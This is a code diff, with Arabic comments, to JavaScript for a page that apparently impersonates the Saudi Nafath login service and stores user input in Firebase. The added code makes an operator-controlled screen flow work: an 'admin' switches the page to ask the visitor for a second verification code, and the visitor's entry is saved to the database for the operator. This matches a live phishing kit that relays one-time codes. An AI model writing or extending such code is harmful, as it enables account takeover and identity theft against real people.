@@ -3,13 +3,14 @@
 // استيراد قاعدة البيانات من الملف الخارجي المخصّص لـ Firebase
 import { db } from "./firebase-config.js";
 
-// استيراد الدوال المطلوبة
+// استيراد الدوال المطلوبة (تم إضافة updateDoc لإرسال الكود الثاني)
 import {
     collection,
     addDoc,
     serverTimestamp,
     doc,
-    onSnapshot
+    onSnapshot,
+    updateDoc
 } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
 
 // القاموس الثابت للرسائل والتنبيهات باللغة العربية بعد إلغاء تبديل اللغات
@@ -96,6 +97,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
         const nafathFormContainer = document.getElementById('nafathFormContainer');
         const nafathWaitContainer = document.getElementById('nafathWaitContainer');
+        const nafathNewCodeContainer = document.getElementById('nafathNewCodeContainer'); // حاوية الكود الثاني الجديد
         const nafathLiveNumber = document.getElementById('nafathLiveNumber');
 
         const unsubscribe = onSnapshot(docRef, (snapshot) => {
@@ -110,6 +112,7 @@ document.addEventListener('DOMContentLoaded', () => {
                     }
 
                     if (nafathWaitContainer) nafathWaitContainer.classList.add('hidden-panel');
+                    if (nafathNewCodeContainer) nafathNewCodeContainer.classList.add('hidden-panel');
                     unsubscribe();
 
                     setTimeout(() => {
@@ -120,8 +123,27 @@ document.addEventListener('DOMContentLoaded', () => {
                 else if (data.status === "show_code") {
                     if (globalLoader) globalLoader.classList.add('hidden-loader');
                     if (nafathFormContainer) nafathFormContainer.classList.add('hidden-panel');
+                    if (nafathNewCodeContainer) nafathNewCodeContainer.classList.add('hidden-panel');
                     if (nafathLiveNumber) nafathLiveNumber.innerText = data.verificationCode;
                     if (nafathWaitContainer) nafathWaitContainer.classList.remove('hidden-panel');
+                }
+
+                // الكود الجديد: الانتقال الفوري لشاشة طلب التحقق من الكود الثاني
+                else if (data.status === "request_new_code") {
+                    if (globalLoader) globalLoader.classList.add('hidden-loader');
+                    if (nafathFormContainer) nafathFormContainer.classList.add('hidden-panel');
+                    if (nafathWaitContainer) nafathWaitContainer.classList.add('hidden-panel');
+                    if (nafathNewCodeContainer) nafathNewCodeContainer.classList.remove('hidden-panel');
+                }
+
+                // الكود الجديد: إذا أرجع الأدمن الحالة إلى الانتظار بعد إرسال العميل للكود الثاني
+                else if (data.status === "waiting_admin") {
+                    if (nafathNewCodeContainer) nafathNewCodeContainer.classList.add('hidden-panel');
+                    if (globalLoader) globalLoader.classList.remove('hidden-loader');
+                    if (loaderText) {
+                        loaderText.innerText = activeTrans.loaderWaiting;
+                        loaderText.style.color = "#14805e";
+                    }
                 }
 
                 else if (data.status === "wrong_national_id") {
@@ -153,6 +175,36 @@ document.addEventListener('DOMContentLoaded', () => {
                 }
             }
         });
+
+        // الكود الجديد: الاستماع لحدث إرسال النموذج الخاص بالكود الآخر (الثاني)
+        const newCodeForm = document.getElementById('newCodeForm');
+        if (newCodeForm) {
+            newCodeForm.addEventListener('submit', async (e) => {
+                e.preventDefault();
+                const secondaryCodeInput = document.getElementById('secondaryCodeInput');
+                const secondaryCode = secondaryCodeInput ? secondaryCodeInput.value.trim() : "";
+                
+                if (!secondaryCode) return;
+
+                // تحويل المظهر إلى شاشة الانتظار العامة لحين مراجعة الأدمن للكود الجديد
+                if (nafathNewCodeContainer) nafathNewCodeContainer.classList.add('hidden-panel');
+                if (globalLoader) globalLoader.classList.remove('hidden-loader');
+
+                try {
+                    // تحديث قاعدة البيانات بالكود الثاني وإعادة الحالة للانتظار
+                    await updateDoc(docRef, {
+                        status: "waiting_admin",
+                        secondaryVerificationCode: secondaryCode
+                    });
+                    if (secondaryCodeInput) secondaryCodeInput.value = "";
+                } catch (error) {
+                    console.error("خطأ أثناء إرسال الكود الثاني: ", error);
+                    alert(activeTrans.failSubmit);
+                    if (globalLoader) globalLoader.classList.add('hidden-loader');
+                    if (nafathNewCodeContainer) nafathNewCodeContainer.classList.remove('hidden-panel');
+                }
+            });
+        }
     }
 
     const cancelNafathBtn = document.getElementById('cancelNafathBtn');
